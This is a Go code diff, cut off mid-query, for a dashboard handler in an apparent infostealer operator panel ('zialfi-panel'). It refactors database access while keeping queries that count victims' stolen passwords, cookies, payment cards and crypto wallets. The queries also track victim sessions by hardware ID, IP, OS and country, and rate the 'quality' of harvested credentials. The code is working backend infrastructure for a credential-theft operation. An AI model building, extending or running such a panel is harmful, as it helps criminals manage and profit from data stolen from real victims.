@@ -6,10 +6,12 @@ import (
 
 	"zialfi-panel/internal/middleware"
 	"zialfi-panel/internal/ws"
+	"zialfi-panel/internal/db"
 )
 
 type StatsHandler struct {
 	db  *sql.DB
+	provider     db.ProviderType
 	hub *ws.Hub
 }
 
@@ -79,8 +81,8 @@ type DomainEntry struct {
 	Count  int    `json:"count"`
 }
 
-func NewStatsHandler(db *sql.DB, hub *ws.Hub) *StatsHandler {
-	return &StatsHandler{db: db, hub: hub}
+func NewStatsHandler(db *sql.DB, hub *ws.Hub, provider db.ProviderType) *StatsHandler {
+	return &StatsHandler{db: db, hub: hub, provider: provider}
 }
 
 func calcChange(today, yesterday int) float64 {
@@ -115,58 +117,58 @@ func (h *StatsHandler) Dashboard(w http.ResponseWriter, r *http.Request) {
 	}
 
 	// Sessions: total, today, yesterday
-	h.db.QueryRow("SELECT COUNT(*) FROM sessions"+whereOwner("", ownerClause), ownerArgs...).Scan(&resp.Sessions.Total)
-	h.db.QueryRow("SELECT COUNT(*) FROM sessions s WHERE date(s.created_at) = date('now')"+ownerClause, ownerArgs...).Scan(&resp.Sessions.Today)
-	h.db.QueryRow("SELECT COUNT(*) FROM sessions s WHERE date(s.created_at) = date('now', '-1 day')"+ownerClause, ownerArgs...).Scan(&resp.Sessions.Yesterday)
+	db.QueryRow(h.db, h.provider, "SELECT COUNT(*) FROM sessions"+whereOwner("", ownerClause), ownerArgs...).Scan(&resp.Sessions.Total)
+	db.QueryRow(h.db, h.provider, "SELECT COUNT(*) FROM sessions s WHERE date(s.created_at) = date('now')"+ownerClause, ownerArgs...).Scan(&resp.Sessions.Today)
+	db.QueryRow(h.db, h.provider, "SELECT COUNT(*) FROM sessions s WHERE date(s.created_at) = date('now', '-1 day')"+ownerClause, ownerArgs...).Scan(&resp.Sessions.Yesterday)
 	resp.Sessions.Change = calcChange(resp.Sessions.Today, resp.Sessions.Yesterday)
 
 	// Passwords: total, today, yesterday
 	var pwToday, pwYesterday int
-	h.db.QueryRow("SELECT COUNT(*) FROM passwords").Scan(&resp.Passwords.Total)
-	h.db.QueryRow("SELECT COUNT(*) FROM passwords p JOIN sessions s ON s.id = p.session_id WHERE date(s.created_at) = date('now')"+ownerClause, ownerArgs...).Scan(&pwToday)
-	h.db.QueryRow("SELECT COUNT(*) FROM passwords p JOIN sessions s ON s.id = p.session_id WHERE date(s.created_at) = date('now', '-1 day')"+ownerClause, ownerArgs...).Scan(&pwYesterday)
+	db.QueryRow(h.db, h.provider, "SELECT COUNT(*) FROM passwords").Scan(&resp.Passwords.Total)
+	db.QueryRow(h.db, h.provider, "SELECT COUNT(*) FROM passwords p JOIN sessions s ON s.id = p.session_id WHERE date(s.created_at) = date('now')"+ownerClause, ownerArgs...).Scan(&pwToday)
+	db.QueryRow(h.db, h.provider, "SELECT COUNT(*) FROM passwords p JOIN sessions s ON s.id = p.session_id WHERE date(s.created_at) = date('now', '-1 day')"+ownerClause, ownerArgs...).Scan(&pwYesterday)
 	resp.Passwords.Today = pwToday
 	resp.Passwords.Yesterday = pwYesterday
 	resp.Passwords.Change = calcChange(pwToday, pwYesterday)
 
 	// Cookies: total, today, yesterday
 	var cToday, cYesterday int
-	h.db.QueryRow("SELECT COUNT(*) FROM cookies").Scan(&resp.Cookies.Total)
-	h.db.QueryRow("SELECT COUNT(*) FROM cookies c JOIN sessions s ON s.id = c.session_id WHERE date(s.created_at) = date('now')"+ownerClause, ownerArgs...).Scan(&cToday)
-	h.db.QueryRow("SELECT COUNT(*) FROM cookies c JOIN sessions s ON s.id = c.session_id WHERE date(s.created_at) = date('now', '-1 day')"+ownerClause, ownerArgs...).Scan(&cYesterday)
+	db.QueryRow(h.db, h.provider, "SELECT COUNT(*) FROM cookies").Scan(&resp.Cookies.Total)
+	db.QueryRow(h.db, h.provider, "SELECT COUNT(*) FROM cookies c JOIN sessions s ON s.id = c.session_id WHERE date(s.created_at) = date('now')"+ownerClause, ownerArgs...).Scan(&cToday)
+	db.QueryRow(h.db, h.provider, "SELECT COUNT(*) FROM cookies c JOIN sessions s ON s.id = c.session_id WHERE date(s.created_at) = date('now', '-1 day')"+ownerClause, ownerArgs...).Scan(&cYesterday)
 	resp.Cookies.Today = cToday
 	resp.Cookies.Yesterday = cYesterday
 	resp.Cookies.Change = calcChange(cToday, cYesterday)
 
 	// Cards: total, today, yesterday
 	var cdToday, cdYesterday int
-	h.db.QueryRow("SELECT COUNT(*) FROM cards").Scan(&resp.Cards.Total)
-	h.db.QueryRow("SELECT COUNT(*) FROM cards d JOIN sessions s ON s.id = d.session_id WHERE date(s.created_at) = date('now')"+ownerClause, ownerArgs...).Scan(&cdToday)
-	h.db.QueryRow("SELECT COUNT(*) FROM cards d JOIN sessions s ON s.id = d.session_id WHERE date(s.created_at) = date('now', '-1 day')"+ownerClause, ownerArgs...).Scan(&cdYesterday)
+	db.QueryRow(h.db, h.provider, "SELECT COUNT(*) FROM cards").Scan(&resp.Cards.Total)
+	db.QueryRow(h.db, h.provider, "SELECT COUNT(*) FROM cards d JOIN sessions s ON s.id = d.session_id WHERE date(s.created_at) = date('now')"+ownerClause, ownerArgs...).Scan(&cdToday)
+	db.QueryRow(h.db, h.provider, "SELECT COUNT(*) FROM cards d JOIN sessions s ON s.id = d.session_id WHERE date(s.created_at) = date('now', '-1 day')"+ownerClause, ownerArgs...).Scan(&cdYesterday)
 	resp.Cards.Today = cdToday
 	resp.Cards.Yesterday = cdYesterday
 	resp.Cards.Change = calcChange(cdToday, cdYesterday)
 
 	// Wallets
-	h.db.QueryRow("SELECT COUNT(*) FROM wallets").Scan(&resp.Wallets.Total)
+	db.QueryRow(h.db, h.provider, "SELECT COUNT(*) FROM wallets").Scan(&resp.Wallets.Total)
 
 	// Duplicates — sessions that share an hwid or ip with another session
 	dupHwidQ := "SELECT COUNT(*) FROM (SELECT hwid FROM sessions s WHERE s.hwid != ''" + ownerClause + " GROUP BY s.hwid HAVING COUNT(*) > 1)"
 	dupIPQ := "SELECT COUNT(*) FROM (SELECT ip FROM sessions s WHERE s.ip != ''" + ownerClause + " GROUP BY s.ip HAVING COUNT(*) > 1)"
-	h.db.QueryRow(dupHwidQ, ownerArgs...).Scan(&resp.Duplicates.Hwid)
-	h.db.QueryRow(dupIPQ, ownerArgs...).Scan(&resp.Duplicates.Ip)
+	db.QueryRow(h.db, h.provider, dupHwidQ, ownerArgs...).Scan(&resp.Duplicates.Hwid)
+	db.QueryRow(h.db, h.provider, dupIPQ, ownerArgs...).Scan(&resp.Duplicates.Ip)
 
 	// Quality — share of passwords with a non-empty value AND a non-empty url
-	h.db.QueryRow("SELECT COUNT(*) FROM passwords").Scan(&resp.Quality.Total)
-	h.db.QueryRow("SELECT COUNT(*) FROM passwords WHERE password_value != '' AND url != ''").Scan(&resp.Quality.Valid)
+	db.QueryRow(h.db, h.provider, "SELECT COUNT(*) FROM passwords").Scan(&resp.Quality.Total)
+	db.QueryRow(h.db, h.provider, "SELECT COUNT(*) FROM passwords WHERE password_value != '' AND url != ''").Scan(&resp.Quality.Valid)
 	if resp.Quality.Total > 0 {
 		resp.Quality.Percentage = float64(resp.Quality.Valid) / float64(resp.Quality.Total) * 100
 	}
 
 	// Countries — distinct non-empty country_code values
-	h.db.QueryRow("SELECT COUNT(DISTINCT s.country_code) FROM sessions s WHERE s.country_code != ''"+ownerClause, ownerArgs...).Scan(&resp.Countries)
+	db.QueryRow(h.db, h.provider, "SELECT COUNT(DISTINCT s.country_code) FROM sessions s WHERE s.country_code != ''"+ownerClause, ownerArgs...).Scan(&resp.Countries)
 
-	geoRows, err := h.db.Query("SELECT s.country_code, COUNT(*) as c FROM sessions s WHERE s.country_code != ''"+ownerClause+" GROUP BY s.country_code ORDER BY c DESC LIMIT 20", ownerArgs...)
+	geoRows, err := db.Query(h.db, h.provider, "SELECT s.country_code, COUNT(*) as c FROM sessions s WHERE s.country_code != ''"+ownerClause+" GROUP BY s.country_code ORDER BY c DESC LIMIT 20", ownerArgs...)
 	if err == nil {
 		defer geoRows.Close()
 		for geoRows.Next() {
@@ -178,7 +180,7 @@ func (h *StatsHandler) Dashboard(w http.ResponseWriter, r *http.Request) {
 	}
 
 	// OS Distribution
-	osRows, err := h.db.Query("SELECT COALESCE(NULLIF(s.os, ''), 'Unknown') as os, COUNT(*) as c FROM sessions s WHERE 1=1"+ownerClause+" GROUP BY os ORDER BY c DESC LIMIT 10", ownerArgs...)
+	osRows, err := db.Query(h.db, h.provider, "SELECT COALESCE(NULLIF(s.os, ''), 'Unknown') as os, COUNT(*) as c FROM sessions s WHERE 1=1"+ownerClause+" GROUP BY os ORDER BY c DESC LIMIT 10", ownerArgs...)
 	if err == nil {
 		defer osRows.Close()
 		for osRows.Next() {
@@ -190,7 +192,7 @@ func (h *StatsHandler) Dashboard(w http.ResponseWriter, r *http.Request) {
 	}
 
 	// Browsers
-	browserRows, err := h.db.Query("SELECT p.browser, COUNT(*) as c FROM passwords p WHERE p.browser != '' GROUP BY p.browser ORDER BY c DESC", ownerArgs...)
+	browserRows, err := db.Query(h.db, h.provider, "SELECT p.browser, COUNT(*) as c FROM passwords p WHERE p.browser != '' GROUP BY p.browser ORDER BY c DESC", ownerArgs...)
 	if err == nil {
 		defer browserRows.Close()
 		for browserRows.Next() {
@@ -202,7 +204,7 @@ func (h *StatsHandler) Dashboard(w http.ResponseWriter, r *http.Request) {
 	}
 
 	// Timeline
-	timelineRows, err := h.db.Query("SELECT date(s.created_at) as d, COUNT(*) FROM sessions s WHERE s.created_at >= datetime('now', '-30 days')"+ownerClause+" GROUP BY d ORDER BY d", ownerArgs...)
+	timelineRows, err := db.Query(h.db, h.provider, "SELECT date(s.created_at) as d, COUNT(*) FROM sessions s WHERE s.created_at >= datetime('now', '-30 days')"+ownerClause+" GROUP BY d ORDER BY d", ownerArgs...)
 	if err == nil {
 		defer timelineRows.Close()
 		for timelineRows.Next() {
@@ -214,7 +216,7 @@ func (h *StatsHandler) Dashboard(w http.ResponseWriter, r *http.Request) {
 	}
 
 	// Top Domains
-	domainRows, err := h.db.Query(`
+	domainRows, err := db.Query(h.db, h.provider, `
 		SELECT
 			COALESCE(
 				CASE
